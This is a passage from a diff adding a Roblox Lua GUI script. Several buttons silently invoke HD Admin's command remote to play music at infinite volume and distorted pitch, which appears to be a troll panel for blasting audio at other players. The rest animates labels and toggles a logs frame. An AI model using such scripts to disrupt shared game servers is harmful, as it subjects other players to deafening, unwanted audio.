+		RequestCommand:InvokeServer(";music 71701207559451 ;volume inf")
+	end)
+end
+task.spawn(SCRIPT_82)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_84()
+local script = UI["84"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 119124023763505 ;volume inf")
+	end)
+end
+task.spawn(SCRIPT_84)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_86()
+local script = UI["86"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 135795229390125 ;volume inf ;pitch 0.3")
+	end)
+end
+task.spawn(SCRIPT_86)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_88()
+local script = UI["88"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 136239974429285 ;volume inf ;pitch 0.2")
+	end)
+end
+task.spawn(SCRIPT_88)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_8a()
+local script = UI["8a"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 9069609200 ;volume inf")
+	end)
+end
+task.spawn(SCRIPT_8a)
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+local function SCRIPT_8c()
+local script = UI["8c"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 140422297140304 ;volume inf")
+	end)
+end
+task.spawn(SCRIPT_8c)
+-- // StarterGui.ScreenGui.ImageLabel.ImageButton.LocalScript \\ --
+local function SCRIPT_90()
+local script = UI["90"]
+	local RunService = game:GetService("RunService")
+	local imageLabel = script.Parent
+	
+	local speed = 15
+	
+	RunService.RenderStepped:Connect(function(deltaTime)
+		imageLabel.Rotation = (imageLabel.Rotation + speed * deltaTime) % 360
+	end)
+end
+task.spawn(SCRIPT_90)
+-- // StarterGui.ScreenGui.ImageLabel.ImageButton.LocalScript \\ --
+local function SCRIPT_91()
+local script = UI["91"]
+	local imageButton = script.Parent
+	local logsFrame = imageButton.Parent:WaitForChild("Logs")
+	
+	imageButton.MouseButton1Click:Connect(function()
+		logsFrame.Visible = not logsFrame.Visible
+	end)
+end
+task.spawn(SCRIPT_91)
+-- // StarterGui.ScreenGui.ImageLabel.ImageLabel.LocalScript \\ --
+local function SCRIPT_96()
+local script = UI["96"]
+	local imageLabel = script.Parent
+	local tweenService = game:GetService("TweenService")
+	local runService = game:GetService("RunService")
+	
+	local baseSize = imageLabel.Size
+	local initialAngle = imageLabel.Rotation ~= 0 and imageLabel.Rotation or -10
+	
+	imageLabel.ImageColor3 = Color3.fromRGB(255, 170, 0)
+	
+	local infoSize = TweenInfo.new(
+		0.8,
+		Enum.EasingStyle.Sine,
+		Enum.EasingDirection.InOut,
+		-1,
+		true
+	)
+	
+	local sizeMeta = {
+		Size = UDim2.new(
+			baseSize.X.Scale,
+			baseSize.X.Offset + 20,
+			baseSize.Y.Scale,
+			baseSize.Y.Offset + 12
+		)
+	}
+	
+	tweenService:Create(imageLabel, infoSize, sizeMeta):Play()
+	
+	local infoRotate = TweenInfo.new(
+		1.4,
+		Enum.EasingStyle.Sine,
+		Enum.EasingDirection.InOut,
+		-1,
+		true
+	)
+	
+	tweenService:Create(imageLabel, infoRotate, {Rotation = initialAngle + 6}):Play()
+	
+	local timeCount = 0
+	runService.RenderStepped:Connect(function(deltaTime)
+		timeCount = timeCount + deltaTime * 2
+		local pulseFactor = (math.sin(timeCount) + 1) / 2
+		imageLabel.ImageTransparency = 0.05 * pulseFactor
+	end)
+end
+task.spawn(SCRIPT_96)
+-- // StarterGui.ScreenGui.ImageLabel.TextLabel.LocalScript \\ --
+local function SCRIPT_98()
+local script = UI["98"]
+	local textLabel = script.Parent
+	local tweenService = game:GetService("TweenService")
+	local runService = game:GetService("RunService")
+	
+	textLabel.TextStrokeTransparency = 0
+	local baseSize = textLabel.Size
+	local initialAngle = textLabel.Rotation ~= 0 and textLabel.Rotation or -10
+	
+	local infoSize = TweenInfo.new(
+		0.8,
+		Enum.EasingStyle.Sine,
+		Enum.EasingDirection.InOut,
+		-1,
+		true
+	)
+	
+	local sizeMeta = {
+		Size = UDim2.new(
+			baseSize.X.Scale,
+			baseSize.X.Offset + 20,
+			baseSize.Y.Scale,
+			baseSize.Y.Offset + 12
+		)
+	}
+	
+	tweenService:Create(textLabel, infoSize, sizeMeta):Play()
+	
+	local infoRotate = TweenInfo.new(
+		1.4,
+		Enum.EasingStyle.Sine,
+		Enum.EasingDirection.InOut,
+		-1,
+		true
+	)
+	
+	tweenService:Create(textLabel, infoRotate, {Rotation = initialAngle + 6}):Play()
+	
+	local timeCount = 0
+	runService.RenderStepped:Connect(function(deltaTime)
+		timeCount = timeCount + deltaTime * 2
+	
+		local colorFactor = (math.sin(timeCount) + 1) / 2
+		local mainColor = Color3.fromRGB(255, 120 + (colorFactor * 80), 0)
+		textLabel.TextColor3 = mainColor
+	
+		local strokeFactor = (math.cos(timeCount * 2) + 1) / 2
+		textLabel.TextStrokeColor3 = Color3.fromRGB(80 + (strokeFactor * 100), 20, 0)
+	end)
+end
+task.spawn(SCRIPT_98)
+
+return UI["1"], require;
